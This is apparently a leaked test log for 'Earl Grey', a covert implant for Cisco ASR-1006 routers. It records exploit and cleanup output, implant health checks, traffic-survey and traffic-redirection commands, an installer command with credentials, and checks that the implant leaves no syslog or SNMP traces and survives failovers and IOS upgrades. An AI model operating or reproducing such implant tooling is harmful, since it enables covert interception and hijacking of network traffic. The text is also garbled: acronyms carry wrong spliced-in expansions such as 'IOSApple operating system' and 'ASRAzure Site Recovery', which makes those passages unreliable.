---[+] Decompressing the cleanup package[+] md5sum /tmp/czdxeqta: de987f0cc31050fe12bdca61e080a252[+] Executing czdxeqta[+] Cleaning up files on SIP[+] Cleaning up files on RP-active[+] Exploit completed successfully
+
+No syslogs, console prints, or SNMPSimple Network Management Protocol messages
+Ran health check successfully:root@debian:/home/user1/release_v1.0.5# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -nUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 55 seconds Redir: Not Running Survey: Not Running
+
+Uninstalled and then reinstalled with R0 / F0 cards as active = successful.... health check = successful (no logs)
+Failed to F1 = no logs other than failover logs, health check comes back successful
+Ran Survey w/seeds going:
+./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=XX.XX.X.X (HURRICANE-9[US])\16,dprt=80,p=3,fields=11111,time=1200,l=survey_module"
+Survey uploaded at an uptime of 2547 seconds with a 1200 second timer. Now, at an uptime of 6917 seconds, the health check says that survey is still running..... will try to wait it out to see when it wraps up...
+The survey showed as running for at least 5000 seconds despite the fact that it was only to run for 1200. They survey results show an actual duration of 1200, however. The balance of time seems to be the "start / stop" time needed for the module. (No logs seen)
+
+
+
+Redirection started at 12:06pm:
+root@debian:/home/user1/release_v1.0.5# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=100.100.40.3,dprt=80,rip=100.100.40.4,p=3,time=1200,l=redir_module"
+Redirection completed successfully (no logs seen)
+
+
+
+Jan. 4th :: More redirection - started 1/4/16 at 0715hrs (without Ixia traffic):
+root@debian:/home/user1/release_v1.0.5# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=100.100.40.3,dprt=80,rip=100.100.40.4,p=3,time=1200,l=redir_module"
+=redirects successfully with only a couple minutes on either side of the actual redirection for startup and stopping of the module
+
+Survey:  ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=XX.XX.X.X (HURRICANE-9[US])\24,dprt=80,p=3,fields=11111,time=1200,l=survey_module"Browsed several sites internal and external to the test network: = survey completed successfully
+
+
+Survey with /16 to gather more potential information: ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=XX.XX.X.X (HURRICANE-9[US])\16,dprt=80,p=3,fields=11111,time=1200,l=survey_module"
+= survey completes successfully – no logs or SNMPSimple Network Management Protocol traps
+
+Started IXIA traffic as high as possible with the for connections
+Started redirection traffic with previous settings to make sure behavior was the same = "sh proc cpu hist" unchanged from prior to starting redirectionLoaded page randomly throughout the redirection to activate the rule... module finished without any logs or performance change on the target ASR, no packet loss on IXIA traffic.
+
+
+Redir with FP failover.... started redir module at 12:05pm...waited for redir to take effect...Failed from FP0 to FP1
+This seems to have immediately canceled the redir module working as my client is no longer being redirected
+Performed health check from ICON and module says that it is still running despite the fact that it's not actually redirecting any longer
+Approximately 30 minutes later, the module shows as no longer running (Health check still comes back successful)
+
+No unexpected syslog or SNMPSimple Network Management Protocol messages not related to the FP failover
+
+
+
+Survey with FP failover... started survey while on FP1 at 12:31pm... waited a couple minutes for module to be fully started... failed over to F0
+Health checks come back successful showing survey still running
+Retrieving survey is successful, but shows no results in the .csv file (maybe because I didn't browse any sites prior to failover???)
+
+
+
+Survey with FP failover...(again with purposeful browsing to see if any results come through)... browsed several sites before failover and after startup period... failed FP over and browsed again after failover... (1/5 continuation) Survey finished up, sent command to retrieve survey and converted to .csb = survey again returned no results due to the FP failover
+
+
+Redir with FP failover and subsequent force quit command ... Started redir modeule for 1200 seconds at 12:53, waited till redir started, then failed over FP card. Health check then shows that the module is still running. Ran the -f force quit command and the module closed out shorty thereafter. No abnormal syslog or SNMPSimple Network Management Protocol logs.
+
+Survey with FP failover and subsequent force quit command... Started survey module for 1900 seconds at 2:00, waited until survey would likely started, then failed over FP card. Ran the -f force quit command and the module closed
+
+
+
+Jan 6th ::IOS upgrade testing
+Current IOS: Cisco IOSApple operating system for small devices Software, IOS-XE Software (X86_64_LINUX_IOSD-ADVIPSERVICES-M), Version 15.2(1)S1, RELEASE SOFTWARE (fc2)
+Copied running config to hard drive. Copied asr1000rp2-advipservices.03.10.01.S.153-3.S1-ext.bin to stby-bootflash
+ASR-1006#issu loadversion rp 1 file stby-bootflash:asr1000rp2-advipservices.03.10.01.S.153-3.S1-ext.bin
+ASR-1006#issu runversion
+Upgrade failed on ASRAzure Site Recovery for reasons that I could not determine, then lost my console windows and couldn't copy the output.
+
+
+Downloading latest 15.3 (w/o crypto) IOSApple operating system for small devices to try upgrading to as it would be more likely that the target upgraded to the latest IOSApple operating system for small devices anyhow.
+Copied asr1000-rp2-advipservices.03.13.04.S-154-3.S4-ext.bin to stby-bootflash
+
+ASR-1006#issu loadversion rp 1 file stby-bootflash:asr1000rp2-advipservices.03.13.04.S.154-3.S4-ext.bin
+Wait to see "terminal state rached" in active RP console
+
+ASR-1006#issu runversion
+ASR fails over to RP1 which is now running the updated version of IOS
+Health checks sent from ICON to target do not come back
+No unexpected SNMPSimple Network Management Protocol or SYSLOG messages are observed
+
+
+ASR-1006#issue abortversionASR fails back to RP0 on original IOSApple operating system for small devices version
+
+Once ASRAzure Site Recovery has converged and normalized.... reinstalled EGEarl Grey (Project name) on target ...Reinstalled successfully
+
+Started redir module
+
+ASR-1006#issu loadversion rp 1 file stby-bootflash:asr1000rp2-advipservices.03.13.04.S.154-3.S4-ext.bin
+Wait to see "terminal state rached" in active RP console
+
+ASR-1006#issu runversion
+ASR fails over to RP1 which is now running the updated version of IOS
+Health checks sent from ICON to target do not come back
+No unexpected SNMPSimple Network Management Protocol or SYSLOG messages are observed
+
+
+ASR-1006#issue abortversionASR fails back to RP0 on original IOSApple operating system for small devices version
+
+Once ASRAzure Site Recovery has converged and normalized.... reinstalled EGEarl Grey (Project name) on target ...Reinstalled successfully
+
+
+
+
+
+
+Jan. 7th ::: Recreate current target state where v1.0.4 was unsuccessfully installed with FP1 active, then uninstalled. Then install new with v1.0.5
+Uninstall 1.0.5 ... wait several minutes to make sure uninstall has completed successfully
+Install v1.0.4 with RP0 and FP1 active
+Note that the output confirms that cleanup with not occur in syslogs
+Uninstall v1.0.4 - note: Jan 7 12:54:25.024 EST: %IOSXE-5-PLATFORM: F1: %SYSTEM-3-SYSTEM_SHELL_LOG: 2016/01/07 12:54:24 : <anon>
+
+
+
+Install v1.0.5 under same circumstances: = install goes through successfullyHealth checks come back successfully
+
+
+
+
+
+
+Jan. 28th ::: Received v1.0.6 for testing. This version enhances the survey capability and reformats the survey report to be more intuitive.
+
+Copied earl-grey_v1.0.6.zip over to EGEarl Grey (Project name) builder VM
+Unzipped EG
+Ran Xtensa command from /earl-grey-1.0.6/implant/qfpRan: ln -s /opt/xtensa-toolchain-root/ xtensa-toolchain-root
+
+copied in previous config.h file to retain previous settings.... did a "make clean release" and copied release folder over to ICON
+Successfully installed on target ASR-1006Sent health check which was received back successfully
+
+Created survey with source XX.XX.X.X (HURRICANE-9[US])/32 to 0.0.0.0/0 = Survey completed successfully with all the expected results. (With and without IXIA traffic,with SEEDS running, and manual browsing of sites from the XX.XX.X.X (HURRICANE-9[US]) host.)
+Created survey with source 0.0.0.0/0 to XX.XX.X.XXX (HURRICANE-9[US])/32 (To simulate outside hosts hitting an internal HTTPHypertext Transfer Protocol server) = Successfully completed with expected results form external hosts in the test environment.
+
+Jan 29th. :::: Created IXIA test that would send random amount of web traffic to the XX.XX.X.XXX (HURRICANE-9[US]) web host on the inside of the target network and started previous survey to survey from source 0.0.0.0/0 to XX.XX.X.XXX (HURRICANE-9[US])/32
+
+
+
+Jan 31 :::
+
+With some IXIA application profile tweaking... was about to get the IXIA to generate some port 1194 traffic to capture as well.
+While running the IXIA traffic generator and capturing a survey via the following command, we able to produce a survey spreadsheet with all ports represented:./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=0.0.0.0\0,dip=XX.XX.X.XXX (HURRICANE-9[US])\32,dprt=80|443|22|23|1194,p=3,fields=11111,time=1000,l=survey_module"
+
+Confirmed redir: 
+
+# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=100.100.40.3,dprt=80,rip=100.100.40.4,p=3,time=1200,l=redir_module"Browser successfully redirects to alternate website and successfully returns when time expires
+
+Performed FP failover without modeule running... health check returns successfully after FP failover.
+
+Performed RP failover to RP2...then reinstalled on RP2
+root@debian:/home/user1/release_v1.0.6# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) baduser "cisco" password ASR-1006 ./test_log c2_manager  clear_exp_history
+Reinstalled successfully on RP2 and failed back to RP1 once RP1 was fully re-initialized
+EG up and running back on R0 / F0
+Forcefailover once more to F1.....  = all failover successfull
+
+
+
+Ran survey after all the failovers with Ixia traffic Survey ran successfully and retrieved successfully... results were as expected.
+
+
+Ran redirection with Ixia trafficSurvey completed successfully and stopped redirecting successfully once the time had expired.
+
+
+
+
+
+
+
+
+
+
+
+
+
+Previous versions:
+| 1 empty
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 
+| 16 
+| 17 
+| 18 
+| 19 
+| 20 
+| 21 
+| 22 
+| 23 
+| 24 
+| 25 
+| 26 
+| 27 
+| 28 
+| 29 
+| 30 
+| 31 
+| 32 
+| 33 
+| 34 
+| 35 
+| 36 
+| 37 
+| 38 
+| 39 
+| 40 
+| 41 
+| 42 
+| 43 
+| 44 
+| 45 
+| 46 
+| 47 
+| 48 
+| 49 
+| 50 
+| 51 
+| 52 
+| 53 
+| 54 
+| 55 
+| 56 
+| 57 
+| 58 
+| 59 
+| 60 
+| 61 
+| 62 
+| 63 
+| 64 
+| 65 
+| 66 
+| 67 
+| 68 
+| 69 
+| 70 
+| 71 
+| 72 
+| 73 
+| 74 
+| 75 
+| 76 
+| 77 
+| 78 
+| 79 
+| 80 
+| 81 
+| 82 
+| 83 
+| 84 
+| 85 
+| 86 
+| 87 
+|
+                    
